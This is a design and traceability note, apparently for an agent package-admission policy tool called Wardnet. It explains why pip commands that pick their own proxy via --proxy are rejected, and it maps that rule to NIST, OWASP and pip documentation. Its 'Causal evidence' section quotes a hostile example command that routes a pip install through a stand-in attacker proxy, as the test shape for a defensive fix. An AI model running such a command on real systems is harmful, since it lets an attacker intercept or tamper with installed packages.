# PyPI global proxy authority — admission traceability

Verified 2026-09-12. This note binds Wardnet's direct-pip proxy-admission rule to pip's documented command grammar and to Wardnet's existing fail-closed software-supply-chain policy. It does not make Wardnet a proxy, network, DNS, TLS, or egress-policy implementation.

## Decision

For direct `pip` and `pip3` installation intents, caller-selected proxy routing is outside the reviewed artifact authority and must fail closed as `alternate_trust_root`. This applies when pip's documented `--proxy <proxy>` General Option appears before the `install` subcommand as well as when the reviewed proxy selector appears after `install`.

Wardnet recognizes only the bounded direct-pip spellings already covered by the admission contract: `--proxy`, the verified unambiguous `--prox` abbreviation, and their non-empty attached-value forms. For a separate-token selector, exactly one following token is consumed as the proxy value for admission parsing. Arbitrary pre-command options are not normalized or silently consumed.

The normalization is policy-internal only. The submitted argv remains immutable evidence: the decision's `command_sha256` is calculated from the original command. A consumed proxy value is not counted as a package artifact, while an actual extra undeclared package remains independently classified as `artifact_not_approved`.

Wardnet does not parse or approve the proxy destination, resolve it, open a connection, enforce redirects, select a route, establish TLS trust, or authorize outbound transport. EgressWeave remains the canonical executable outbound-transport authority; quarantine-sandbox-runtime remains the hostile execution/isolation owner. An Agent Artifact Admission `allow` or `block` decision therefore cannot replace either control.

## Causal evidence

Issue #347 identified the parser-valid hostile shape:

```text
pip --proxy http://attacker.invalid:8080 install cwl-example==1.2.3 --require-hashes --no-deps --no-input
```

The test-only head `ebbaeab99b93e1ba8a630a29b7bd6407ea23002a` preserved production source and produced semantic hosted RED in CI run `34663758483`, rust job `103471407614`: predecessor policy returned `forbidden_command` plus `artifact_not_approved` rather than the causal proxy/trust-authority classification.

The minimum source repair started at `0e58a71968acd534355e4a1ad904ba04d32ad054` and is exercised by `crates/agent-artifact-admission/tests/pypi_proxy_authority_contract.rs`. The contract covers `pip` and `pip3`, separate and attached proxy values, original-command digest preservation, a genuine extra package beside the proxy option, and an unreviewed global option that must remain fail closed instead of acquiring invented proxy semantics.

## Standards and primary-source mapping

| Control | Source | Application in Wardnet |
| --- | --- | --- |
| Treat installer routing/configuration as security-relevant input rather than implicit authority | NIST SP 800-218 v1.1, PW.4 and PW.7 secure design/verification practices | Unreviewed installer capability changes fail closed before execution. |
| Preserve auditable evidence of the submitted action | NIST SP 800-218 v1.1 secure-development evidence practices | Internal canonicalization does not rewrite `command_sha256`; the original argv remains the evidence identity. |
| Deny unintended trust-boundary expansion | OWASP ASVS 5.0.0 verification principles for secure communications and configuration | Caller-selected proxy authority is classified separately from artifact identity and cannot inherit package approval. |
| Interpret the command according to the tool's documented surface | pip General Options and pip user guide | `--proxy` is a pip command-line proxy selector and may be supplied as a general option; Wardnet tests the verified pre-`install` placement rather than assuming `install` is always argv[1]. |

NIST guidance is used as secure-development justification, not as a claim that Wardnet is NIST-certified. OWASP ASVS is used as verification guidance, not as a conformance claim. pip documentation is the authoritative command-surface source; Wardnet deliberately implements only the reviewed subset needed for fail-closed admission and does not reproduce pip's full parser.

## References

National Institute of Standards and Technology. (2022). *Secure Software Development Framework (SSDF) version 1.1: Recommendations for mitigating the risk of software vulnerabilities* (NIST SP 800-218). https://doi.org/10.6028/NIST.SP.800-218

OWASP Foundation. (2025). *OWASP Application Security Verification Standard 5.0.0*. https://owasp.org/www-project-application-security-verification-standard/

pip developers. (2026). *pip: General options*. https://pip.pypa.io/en/stable/cli/pip/

pip developers. (2026). *pip user guide: Using a proxy server*. https://pip.pypa.io/en/stable/user_guide/
